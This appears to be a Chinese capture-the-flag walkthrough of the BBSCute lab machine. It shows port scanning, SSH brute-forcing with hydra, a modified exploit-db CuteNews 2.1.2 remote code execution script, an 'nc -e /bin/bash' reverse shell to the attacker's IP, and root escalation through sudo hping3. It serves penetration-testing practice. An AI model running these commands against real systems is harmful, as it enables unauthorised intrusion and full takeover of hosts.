# Esay_BBSCute

## 总结

getwebshell → 目录扫描发现新端点 → 指纹探测发现CMS → 查看文章发现版本信息 → MSF → 调配修改获得shell

getshell → sudo发现hping3 → 利用hping3提权

## 准备工作

  * 启动VPN  
获取攻击机IP > `192.168.45.176`

![](https://image.3001.net/images/20230723/1690047644_64bc149ca48543f6e2b5b.png!small)

  * 启动靶机

  * 获取目标机器IP > `192.168.190.128`

![](https://image.3001.net/images/20230723/1690047645_64bc149d9fa08237f7e25.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.190.128
    

![](https://image.3001.net/images/20230723/1690047646_64bc149e771d62d21e624.png!small)

>[!通过各两次扫描收集到端口 ]  
>22,80,88,110,995

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80,88,110,995 192.168.190.128
    

![](https://image.3001.net/images/20230723/1690047647_64bc149f84adf4297a6ff.png!small)

## 信息收集-端口测试

  * 22-open-openssh 7.9p1

  * 80-open-http

  * 88-open-http

  * 110-open-pop3

  * 995-open-ssl/pop3  
总体来看，突破口在80端口以及88端口

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用(无)

通过`Nmap`探测获得SSH的版本信息，可以尝试利用

    
    
    # 进入msf
    msfcontrol
    # 探测版本为OpenSSH 7.9p1 搜索对应脚本
    msf6 > searchsploit openssh 7.9
    

![](https://image.3001.net/images/20230723/1690047648_64bc14a0b83ff6c158fe5.png!small)

#### 22-SSH手动登录尝试(失败)

尝试`root`账户的密码爆破发现报错之后进行手动尝试

    
    
    ssh root@192.168.190.128</span> ssh -p22
    # 密码尝试
    password > root
    

![](https://image.3001.net/images/20230723/1690047649_64bc14a1c435e0b619370.png!small)

#### 22-SSH弱口令爆破(慢慢跑)

尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6  
慢慢跑吧，不指望

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/password.lst -t 6 -vV 192.168.190.128 ssh -s 22
    

![](https://image.3001.net/images/20230723/1690047650_64bc14a2d5b3b8d6f1369.png!small)

### 80-HTTP端口的信息收集

http://192.168.190.128:80

![](https://image.3001.net/images/20230723/1690047652_64bc14a413f2c888f4332.png!small)  
通常遇到这样的网站之后我们直接从收集源码开始

#### 信息收集-源码查看(无)

    
    
    curl http://192.168.190.128:80
    

整体翻阅了一下，无泄露信息

![](https://image.3001.net/images/20230723/1690047653_64bc14a530a5beb6596cf.png!small)

#### 信息收集-基础目录扫描

    
    
    dirsearch -u http://192.168.190.128:80 -x 302,403
    

发现内容之后，我们先不考虑上大字典

![](https://image.3001.net/images/20230723/1690047654_64bc14a6c63db9cb95dce.png!small)

#### 信息收集-dirsearch深层目录扫描(待定)

#### 信息收集-端点访问

寻找可用端点

##### /example.php端点

![](https://image.3001.net/images/20230723/1690047656_64bc14a87417cbd8cabfe.png!small)

##### /manual/en/index.html端点

![](https://image.3001.net/images/20230723/1690047657_64bc14a94bf4278fcb0e8.png!small)

##### /print.php端点

![](https://image.3001.net/images/20230723/1690047658_64bc14aa2a29da4fe8f16.png!small)

##### /rss.php端点

![](https://image.3001.net/images/20230723/1690047659_64bc14ab28a3085d12d50.png!small)

##### /search.php端点

![](https://image.3001.net/images/20230723/1690047659_64bc14abf182a142feafe.png!small)

##### /index.php端点

![](https://image.3001.net/images/20230723/1690047660_64bc14acbbc13b6ea92e8.png!small)

#### 信息收集-指纹识别

通过端点访问，首先选取最感兴趣的进行探索(登录功能点)

    
    
    ┌──(root㉿Kali)-[/home/bachang/BBSCute]
    └─# whatweb http://192.168.190.128:80/index.php
    http://192.168.190.128:80/index.php [200 OK] Apache[2.4.38], Bootstrap, Cookies[CUTENEWS_SESSION], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.190.128], JQuery, PasswordField[password], Script[text/javascript], Title[Please Login / CuteNews], UncommonHeaders[accept-charset], X-Frame-Options[sameorigin], X-UA-Compatible[IE=edge]
    

获取了CMS的指纹`CuteNews`，如果知道版本就可用msf精准打击

#### 信息收集-源码查看

    
    
    # 利用html2text转换纯文本方便查看
    curl http://192.168.190.128:80/index.php | html2text
    

查看之后获取到了新的信息`CuteNews`的版本为2.1.2

![](https://image.3001.net/images/20230723/1690047661_64bc14ada6f2b9457b0fb.png!small)

### 88-HTTP端口的信息收集

什么!?还要收集吗？ 80端口都`getwebshell`啦?

## 漏洞利用-getwebshell

#### 漏洞利用-msf网站指纹(尝试)

    
    
    # 首先进入msf终端
    msfconsole
    # 搜索对应的漏洞是否存在
    msf6 > searchsploit cutenews 2.1.2
    

可以思考的是第一个、第三个、第四个。第二个文件删除不能直接getwebshell  
其中第三个文件上传相对要复杂一些  
第一个可能有前置条件，保险一些先试试第四个?

![](https://image.3001.net/images/20230723/1690047662_64bc14ae8234d2758db85.png!small)

    
    
    # 如果想查看msf对应的内容
    cat /usr/share/exploitdb/exploits/php/webapps/48800.py
    

细细翻阅一下

![](https://image.3001.net/images/20230723/1690047664_64bc14b075427be0ae793.png!small)  
大致了解了脚本的情况，运行了之后让我们输入IP，之后就会根据代码逻辑获得`cmd`的`shell`

![](https://image.3001.net/images/20230723/1690047665_64bc14b16ec3e118b0dd4.png!small)

![](https://image.3001.net/images/20230723/1690047666_64bc14b26f0fe8e649300.png!small)

一般获取脚本之后我们就清楚需要是否需要修改shell以及输入内容等

    
    
    # 尝试运行，发现没运行成功捏
    python3 /usr/share/exploitdb/exploits/php/webapps/48800.py
    [->] Usage python3 expoit.py
    
    Enter the URL> http://192.168.190.128:80
    ================================================================
    Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
    ================================================================
    [-] No hashes were found skipping!!!
    ================================================================
    
    =============================
    Registering a users
    =============================
    

![](https://image.3001.net/images/20230723/1690047667_64bc14b355f022a289949.png!small)  
运行没成功说明可能其他地方还需要修改或者该`exp`不适用  
首先进行`url`的排查

    
    
    cat /usr/share/exploitdb/exploits/php/webapps/48800.py
    

查看了一下，发现`exp`的`url`是加了`/CuteNews`端点，和我们现在不符，进行删除

![](https://image.3001.net/images/20230723/1690047668_64bc14b4251c3f3935747.png!small)

    
    
    # cp到本地一份方便修改(这是好习惯)
    ┌──(root㉿Kali)-[/home/bachang/BBSCute]
    └─# cp /usr/share/exploitdb/exploits/php/webapps/48800.py .
    # 查询有几处
    ┌──(root㉿Kali)-[/home/bachang/BBSCute]
    └─# grep CuteNews 48800.py
    url = f"{ip}/CuteNews/cdata/users/lines"
    register = sess.post(f"{ip}/CuteNews/index.php?register", data = postdata, allow_redirects = False)
    token = sess.get(f"{ip}/CuteNews/index.php?mod=main&opt=personal").text
    payload_send = sess.post(f"{ip}/CuteNews/index.php", files = files).text
    output = sess.post(f"{ip}/CuteNews/uploads/avatar_{logged_user}_{logged_user}.php", data=postdata)
    # 修改了5处地方
    ┌──(root㉿Kali)-[/home/bachang/BBSCute]
    └─# vim 48800.py 
    # 再次查看已经没有了
    ┌──(kali㉿kali)-[~]
    └─$ grep CuteNews 48800.py
    # 尝试运行
    python 48800.py
    

运行成功，获取了`cmd`的`shell`

![](https://image.3001.net/images/20230723/1690047669_64bc14b5218c131f48fdb.png!small)

    
    
    # ps 翻阅了一下不用苦逼的vim修改，利用sed 将所有的 “CuteNews/” 替换为空字符串
    sed -i 's:CuteNews/::g' 48800.py
    # 查看一下权限
    command > id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

## 内网遨游-getshell

发现hydra还没爆破出来，关了关了

![](https://image.3001.net/images/20230723/1690047670_64bc14b6215daf735dbe8.png!small)

### 获取交互shell

现在我们的`shell`是利用`python`的`exp`获取的，我们获取本地的`shell`会更好  
利用`反弹shell`弹到本地

#### 反弹shell-nc

    
    
    # 攻击机先开启监听
    nc -lvvp 4444
    
    
    
    # 目标主机nc反弹shell
    nc -e /bin/bash 192.168.45.176 4444
    

![](https://image.3001.net/images/20230723/1690047672_64bc14b83dde298c48edc.png!small)

#### 交互shell-python

由于反弹获取的`shell`交互不友好，利用`python`获得新的交互`shell`

    
    
    # 利用python获取交互shell -> python失败使用python3
    python -c "import pty;pty.spawn('/bin/bash')";
    

![](https://image.3001.net/images/20230723/1690047674_64bc14ba6cf78b0f263cf.png!small)

### FLAG1获取

    
    
    www-data<span>@cute</span>:/var/www/html/uploads$ find / -name local.txt 2>/dev/null
    find / -name local.txt 2>/dev/null
    /var/www/local.txt
    www-data<span>@cute</span>:/var/www/html/uploads$ cat /var/www/local.txt
    cat /var/www/local.txt
    *****************************
    

![](https://image.3001.net/images/20230723/1690047675_64bc14bb504c4edb4524a.png!small)

### 权限提升

访问 https://gtfobins.github.io 寻找

#### Linux提权-sudo提权尝试

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    www-data<span>@cute</span>:/var/www/html/uploads$ sudo -l
    sudo -l
    Matching Defaults entries for www-data on cute:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User www-data may run the following commands on cute:
        (root) NOPASSWD: /usr/sbin/hping3 --icmp
    

发现`hping3`存在sudo权限

![](https://image.3001.net/images/20230723/1690047676_64bc14bc60b4440dde760.png!small)  
如果发现sudo -l有东西的话 访问 https://gtfobins.github.io 寻找

![](https://image.3001.net/images/20230723/1690047677_64bc14bd8b8f24daefea5.png!small)

    
    
    www-data<span>@cute</span>:/var/www/html/uploads$ hping3
    hping3> /bin/sh -p
    # whoami
    root
    

成功提权

![](https://image.3001.net/images/20230723/1690047678_64bc14be570980d95b6bd.png!small)

### FLAG2

    
    
    # cat /root/proof.txt
    *************************
    

结束撒花~谢谢观看~~

![](https://image.3001.net/images/20230723/1690047679_64bc14bf564a56233b2e3.png!small)

